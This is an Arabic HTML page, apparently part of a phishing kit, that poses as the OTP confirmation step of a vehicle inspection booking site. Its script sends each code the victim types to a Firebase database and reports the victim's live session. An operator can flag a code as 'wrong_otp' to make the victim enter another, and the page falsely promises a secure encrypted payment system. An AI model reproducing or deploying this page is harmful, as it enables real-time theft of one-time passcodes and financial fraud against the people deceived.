<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية - الرمز الآمن</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --error-red: #d93025; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }

        .otp-container {
            background: #fff;
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            padding-bottom: 25px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
            text-align: center;
            overflow: hidden;
        }

        .header-image { width: 100%; max-width: 180px; height: auto; margin: 20px auto 10px; display: block; }
        .content { padding: 0 20px; }
        h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
        p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 20px; }

        .otp-single-field {
            width: 100%; max-width: 220px; height: 45px; border: 1px solid #ddd;
            border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 4px;
            font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa; margin-bottom: 10px;
            transition: 0.3s;
        }

        .otp-single-field.error-border { border: 2px solid var(--error-red); background-color: #fff8f8; color: var(--error-red); }

        #errorMsg { color: var(--error-red); font-size: 12px; font-weight: bold; margin-bottom: 15px; display: none; }

        .timer-box { font-size: 12px; color: #999; margin-bottom: 20px; min-height: 20px; }
        .resend-link { color: var(--main-green); font-weight: bold; cursor: pointer; text-decoration: underline; }

        .btn-confirm { width: 100%; background-color: var(--main-green); color: white; border: none; border-radius: 10px; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .btn-confirm:hover { background-color: #145230; }
        .btn-confirm:disabled { background-color: #ccc; cursor: not-allowed; }
        .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
    </style>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="منصة حجز مواعيد الفحص الفني الدوري للمركبات">
    <meta name="keywords" content="فحص سيارات, حجز موعد, فحص دوري">
    <meta name="author" content="مركز سلامة المركبات">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="website">
    <meta property="og:title" content="منصة حجز مواعيد الفحص الفني">
    <meta property="og:description" content="منصة موحدة لحجز مواعيد الفحص الفني الدوري">
    <meta property="og:url" content="https://jaufasnfsa.vercel.app">
    <meta property="og:site_name" content="مركز سلامة المركبات">
    <meta name="theme-color" content="#2d5016">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
</head>
<body>

    <div class="otp-container">
        <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" class="header-image" alt="OTP Security">
        <div class="content">
            <h2>أدخل رمز التحقق</h2>
            <p>يرجى إدخال الرمز المرسل لجوالك (4 أو 6 أرقام).</p>

            <div id="errorMsg">برجاء التحقق من رمز التحقق (OTP) المرسل عبر الجوال</div>

            <input type="tel" maxlength="6" class="otp-single-field" id="otpCode" placeholder="------" autocomplete="one-time-code">

            <div class="timer-box" id="timerBox">
                إعادة إرسال الرمز خلال <span id="timeCount">02:00</span> دقيقة
            </div>
            
            <button class="btn-confirm" id="confirmBtn" onclick="sendOTP()">تأكيد العملية</button>
            <div class="secure-notice">🔒 نظام دفع مشفر وآمن بالكامل</div>
        </div>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
            projectId: "saso-inspection" 
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id');

        // تعريف مرجع الأوامر عالمياً عشان نقدر نقفله
        let orderRef;

        if (v_id) {
            database.ref('live_sessions/' + v_id).update({
                current_page: "صفحة التحقق (OTP)",
                last_seen: new Date().getTime()
            });

            // مراقبة الأوامر
            orderRef = database.ref('orders/' + v_id + '/next_step');
            orderRef.on('value', (snapshot) => {
                const step = snapshot.val();
                if (step === 'wrong_otp') {
                    document.getElementById('otpCode').classList.add('error-border');
                    document.getElementById('errorMsg').style.display = 'block';
                    document.getElementById('otpCode').value = ''; 
                    const btn = document.getElementById('confirmBtn');
                    btn.disabled = false;
                    btn.innerText = "تأكيد العملية";
                    
                    // تصفير الحالة فوراً بعد إظهار الخطأ لمنع التوجيه التلقائي لاحقاً
                    database.ref('orders/' + v_id).update({ next_step: 'waiting' });
                }
            });
        }

        let timeLeft = 120;
        const timeDisplay = document.getElementById('timeCount');
        const timerBox = document.getElementById('timerBox');

        function startTimer() {
            const timer = setInterval(() => {
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    timerBox.innerHTML = '<span class="resend-link" onclick="location.reload()">إعادة إرسال الرمز الآن</span>';
                } else {
                    timeLeft--;
                    let minutes = Math.floor(timeLeft / 60);
                    let seconds = timeLeft % 60;
                    timeDisplay.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
            }, 1000);
        }

        window.onload = startTimer;

        function sendOTP() {
            let otpVal = document.getElementById('otpCode').value;
            const btn = document.getElementById('confirmBtn');

            if ((otpVal.length === 4 || otpVal.length === 6) && v_id) {
                // 1. تعطيل الزرار فوراً
                btn.disabled = true;
                btn.innerText = "جاري التحقق...";

                // 2. إيقاف مراقبة الفايربيس في هذه الصفحة تماماً (Kill Listener)
                if (orderRef) { orderRef.off(); }

                document.getElementById('otpCode').classList.remove('error-border');
                document.getElementById('errorMsg').style.display = 'none';

                // 3. تحديث البيانات وتصفير الأمر القادم
                database.ref('orders/' + v_id).update({
                    otp_code: otpVal,
                    status: "تم إرسال OTP - انتظار القرار",
                    next_step: "waiting", // إجبار الحالة على الانتظار
                    last_update: new Date().getTime()
                }).then(() => {
                    // 4. التحويل لصفحة الانتظار باستخدام replace لضمان عدم العودة
                    setTimeout(() => {
                        window.location.replace('processing.html');
                    }, 300);
                }).catch(() => {
                    window.location.replace('processing.html');
                });
            } else {
                alert("يرجى إدخال رمز صحيح مكون من 4 أو 6 أرقام.");
            }
        }

        document.getElementById('otpCode').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
